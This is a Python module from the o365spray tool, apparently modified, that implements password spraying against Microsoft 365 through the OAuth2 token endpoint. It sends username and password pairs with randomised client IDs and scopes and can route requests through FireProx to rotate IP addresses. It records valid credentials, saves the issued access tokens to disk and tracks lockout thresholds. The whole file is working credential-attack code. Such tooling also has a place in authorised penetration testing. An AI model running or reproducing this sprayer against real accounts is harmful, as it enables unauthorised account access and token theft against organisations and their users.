#!/usr/bin/env python3

import json
import logging
import time

from o365spray.core.handlers.sprayer.modules.base import SprayerBase
from o365spray.core.utils import (
    Defaults,
    Helper,
    text_colors,
)


class SprayModule_oauth2(SprayerBase):
    """oAuth2 Sprayer module class"""

    def __init__(self, *args, **kwargs):
        """Initialize the parent base class"""
        super(SprayModule_oauth2, self).__init__(*args, **kwargs)

    def _spray(self, domain: str, user: str, password: str):
        """Spray users via Microsoft's oAuth2 endpoint

        Arguments:
            domain: domain to spray
            user: username for authentication
            password: password for authentication

        Raises:
            ValueError: if locked account limit reached
            Exception: generic handler so we can successfully fail without
              crashing the run
        """
        try:
            # Updated: abort early if lockout threshold already reached.
            if self._should_abort():
                return

            # Grab prebuilt office headers
            # Updated: copy headers to avoid cross-request mutation.
            headers = Defaults.HTTP_HEADERS.copy()
            headers["Accept"] = "application/json"
            headers["Content-Type"] = "application/x-www-form-urlencoded"

            # Build email if not already built
            email = self.HELPER.check_email(user, domain)

            # Write the tested user
            tested = f"{email}:{password}"
            if self.writer:
                self.tested_writer.write(tested)

            time.sleep(0.250)

            # Scope, resource, client_id must be valid for authentication
            # to complete
            scope = Helper.get_random_sublist_from_list(Defaults.SCOPES)
            data = {
                "resource": Helper.get_random_element_from_list(Defaults.RESOURCES),
                "client_id": Helper.get_random_element_from_list(Defaults.CLIENT_IDS),
                "grant_type": "password",
                "username": email,
                "password": password,
                "scope": " ".join(scope),
            }

            # Handle FireProx API URL
            if self.proxy_url:
                proxy_url = self.proxy_url.rstrip("/")
                url = f"{proxy_url}/common/oauth2/token"

                # Update headers
                headers = Helper.fireprox_headers(headers)

            else:
                url = "https://login.microsoftonline.com/common/oauth2/token"

            # Updated: include retry configuration for transient failures.
            response = self._send_request(
                "post",
                url,
                data=data,
                headers=headers,
                proxies=self.proxies,
                timeout=self.timeout,
                sleep=self.sleep,
                jitter=self.jitter,
                retries=self.request_retries,
                retry_backoff=self.request_retry_backoff,
                # Updated: include request context for per-request logging.
                log_context={
                    "module": self.module_tag,
                    "action": "spray",
                    "target": email,
                    "username": user,
                    "password": password,
                },
            )

            status = response.status_code
            if status == 200:
                if self.writer:
                    self.valid_writer.write(tested)
                self.VALID_CREDENTIALS.append(tested)
                # Updated: richer CLI output for valid responses.
                self._log_spray_result(
                    "VALID",
                    email,
                    password,
                    status=status,
                    reason=response.reason,
                    detail="OAuth2 token issued",
                )
                # Remove valid user from being sprayed again
                self.userlist.remove(user)

                # If a token was returned, attempt to write the token
                # to disk for future use
                try:
                    token_file = f"{self.output_dir}{email}.token.json"
                    with open(token_file, "w") as f:
                        json.dump(response.json(), f)

                except:
                    pass

            else:
                # Handle Microsoft AADSTS errors
                # Updated: tolerate non-JSON responses for robust logging.
                try:
                    body = response.json()
                    error = body["error_description"].split("\r\n")[0]
                except Exception:
                    body = {}
                    error = response.text
                self._check_aadsts(
                    user,
                    email,
                    password,
                    error,
                    status=status,
                    reason=response.reason,
                )

        except Exception as e:
            # Updated: surface request failures with context.
            logging.warning(
                f"[{text_colors.WARNING}REQUEST_FAILED{text_colors.ENDC}] "
                f"{user} | module={self.module_tag} | error={type(e).__name__}: {e}"
            )
            pass
